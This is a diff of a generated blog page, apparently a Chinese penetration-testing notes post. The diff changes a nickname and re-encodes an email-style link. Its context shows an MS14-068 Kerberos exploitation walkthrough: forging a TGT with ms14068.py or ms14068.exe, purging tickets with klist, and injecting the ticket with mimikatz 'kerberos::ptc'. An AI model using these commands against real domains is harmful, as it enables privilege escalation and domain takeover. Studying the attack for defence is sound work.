@@ -70,7 +70,7 @@
         <img src="/images/avatar.png" alt="">
       
     </a>
-    <div class="nickname"><a href="/">17year [地球人]</a></div>
+    <div class="nickname"><a href="/">17year</a></div>
   </div>
   <div class="navbar">
     <ul>
@@ -424,7 +424,7 @@ MathJax = {
 <h3 id="ms14-068-Kerberos漏洞利用："><a href="#ms14-068-Kerberos漏洞利用：" class="headerlink" title="ms14-068 Kerberos漏洞利用："></a>ms14-068 Kerberos漏洞利用：</h3><p>生成TGT：用于伪造</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">whoami /all</span><br><span class="line">                      用户@ 域名                 用户sid    域主机</span><br><span class="line">python ms14068.py -u admin@xxx.com -p password -s sid -d dc.xxx.com</span><br><span class="line">ms14068.exe -u admin@xxx.com -p password -s sid -d dc.xxx.com</span><br></pre></td></tr></table></figure>
 
-<p>会生成<a href="mailto:&#84;&#x47;&#84;&#x5f;&#x61;&#x64;&#x6d;&#105;&#110;&#64;&#120;&#120;&#120;&#46;&#x63;&#111;&#x6d;&#x2e;&#x63;&#x63;&#x61;&#x63;&#104;&#101;">&#84;&#x47;&#84;&#x5f;&#x61;&#x64;&#x6d;&#105;&#110;&#64;&#120;&#120;&#120;&#46;&#x63;&#111;&#x6d;&#x2e;&#x63;&#x63;&#x61;&#x63;&#104;&#101;</a></p>
+<p>会生成<a href="mailto:&#84;&#71;&#x54;&#95;&#x61;&#100;&#109;&#x69;&#x6e;&#x40;&#x78;&#120;&#x78;&#x2e;&#99;&#111;&#109;&#x2e;&#x63;&#99;&#x61;&#99;&#x68;&#x65;">&#84;&#71;&#x54;&#95;&#x61;&#100;&#109;&#x69;&#x6e;&#x40;&#x78;&#120;&#x78;&#x2e;&#99;&#111;&#109;&#x2e;&#x63;&#99;&#x61;&#99;&#x68;&#x65;</a></p>
 <p>注入TGT：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">klist</span><br><span class="line">klist purge 清除所有凭证，等一会在执行下列命令(https://www.t00ls.net/thread-28727-1-1.html)</span><br><span class="line">写入内存 mimikatz.exe &quot;kerberos::ptc c:\TGT_admin@xxx.com.ccache&quot;</span><br></pre></td></tr></table></figure>
 
